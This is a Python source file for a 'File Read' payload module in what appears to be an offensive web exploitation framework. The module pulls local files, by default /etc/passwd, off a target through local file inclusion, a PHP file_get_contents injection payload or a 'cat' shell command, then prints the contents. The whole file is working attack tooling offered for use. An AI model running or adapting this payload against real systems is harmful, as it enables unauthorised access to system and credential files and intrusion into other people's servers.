"""
HWP Payload — File Read

Read local files from the target via LFI.

Options:
    --file      File path to read (default: /etc/passwd)
"""

from hwp import Payload


class FileRead(Payload):
    name = "File Read"
    methods = ["LFI", "FILEDL", "RCE", "RCEs"]
    description = "Read a local file from the target"
    options = [
        {"name": "file", "default": "/etc/passwd", "help": "File path to read"},
    ]

    def instructions(self):
        filepath = self.options.get("file", "/etc/passwd")
        self.info(f"Reading: {filepath}")

        if self.method in ("LFI", "FILEDL"):
            return [filepath]
        elif self.method == "RCE":
            safe = filepath.replace("'", "\\'")
            return [f"<?php echo file_get_contents('{safe}'); ?>"]
        elif self.method == "RCEs":
            return [f"cat {filepath}"]

    def report(self, results):
        for r in results:
            if r.success and r.output:
                self.success("File contents:")
                print(r.output)
